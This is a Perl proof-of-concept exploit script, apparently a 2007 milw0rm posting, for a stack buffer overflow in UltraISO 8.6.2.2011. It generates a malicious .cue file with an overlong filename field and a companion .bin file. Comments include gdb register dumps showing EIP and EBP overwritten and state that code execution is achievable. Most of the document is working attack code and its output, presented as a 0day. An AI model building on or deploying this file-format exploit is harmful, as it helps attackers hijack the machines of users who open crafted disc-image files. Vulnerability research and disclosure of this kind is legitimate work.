#!/usr/bin/perl
############################################################
#Credit:To n00b for finding this bug and writing poc.
############################################################
#Ultra ISO stack over flow poc code.
#Ultra iso is exploitable via opening
#a specially crafted Cue file..There is 
#A limitation that the user must have the bin 
#file in the same dir as the cue file.
#This is the reason i have provided the 
#Bin file also Command execution is possible
#As we can control $ebp and $eip hoooooha.
#I will be working on the local exploit 
#as soon as i get a chance this should be a straight forward 
#to exploit this as we already gain control of the
#$eip register..
#Tested on :win xp service pack 2 
#Vendor's web site: http://www.ezbsystems.com/ultraiso
# Version affected: UltraISO 8.6.2.2011
############################################################
#Debug info as follows.
#########################################
#Program received signal SIGSEGV, Segmentation fault.
#[Switching to thread 1696.0x6d0]
#0x41414141 in ?? ()
############################################################
#(gdb) i r
#eax            0x0      0
#ecx            0x7ce2fc 8184572
#edx            0x1      1
#ebx            0xfe6468 16671848
#esp            0x13ecf8 0x13ecf8
#ebp            0x41414141       0x41414141
#esi            0x0      0
#edi            0x13fa18 1309208
#eip            0x41414141       0x41414141
#eflags         0x10246  66118
#cs             0x1b     27
#ss             0x23     35
#ds             0x23     35
#es             0x23     35
#fs             0x3b     59
#gs             0x0      0
#fctrl          0xffff1273       -60813
#fstat          0xffff0000       -65536
#ftag           0xffffffff       -1
#fiseg          0x0      0
#fioff          0x0      0
#foseg          0xffff0000       -65536
#fooff          0x0      0
#---Type <return> to continue, or q <return> to quit---
#fop            0x0      0
#(gdb)
############################################################

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "0day Ultra-Iso 8.6.2.2011 stack over flow poc  \n";
print "Credits to n00b for finding the bug and writing poc\n";
print "I will be writing a local exploit for this in a few days\n";
print "Shouts:  - Str0ke - Marsu  - SM - Aelphaeis - vade79 - c0ntex\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";

my $CUEFILE="1.cue"; # Do not edit this 

my $BINFILE="1.bin"; # Do not edit this 

my $header= "\x46\x49\x4c\x45\x20\x22";

my $endheader= "\x2e\x42\x49\x4e\x22\x20\x42\x49\x4e\x41\x52\x59\x0d\x0a\x20".
               "\x54\x52\x41\x43\x4b\x20\x30\x31\x20\x4d\x4f\x44\x45\x31\x2f\x32".
               "\x33\x35\x32\x0d\x0a\x20\x20\x20\x49\x4e\x44\x45\x58\x20\x30\x31".
               "\x20\x30\x30\x3a\x30\x30\x3a\x30\x30";

open(CUE, ">$CUEFILE") or die "ERROR:$CUEFILE\n";

open(BIN, ">$BINFILE") or die "ERROR:$BINFILE\n";

print CUE $header;

for ($i = 0; $i < 1024; $i++) { # Fill our buffer
$buffer.= "\x41"; # For easy of debugging
}
print CUE $buffer;

for ($i = 0; $i < 100; $i++) { # Fill our buffer
$buffer2.= "\x90"; # Fill our bin file with nops..Why not pmsl.
}
print BIN $buffer2;

print CUE $endheader;

close(CUE,BIN);

sleep(5);

print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "Files have been created success-fully\n";
print "Please note you will have to have both 1.cue and 1.bin in the same dir\n";
print "To be able to reproduce the bug open the 1.cue file with ultra~iso\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";

# milw0rm.com [2007-05-24]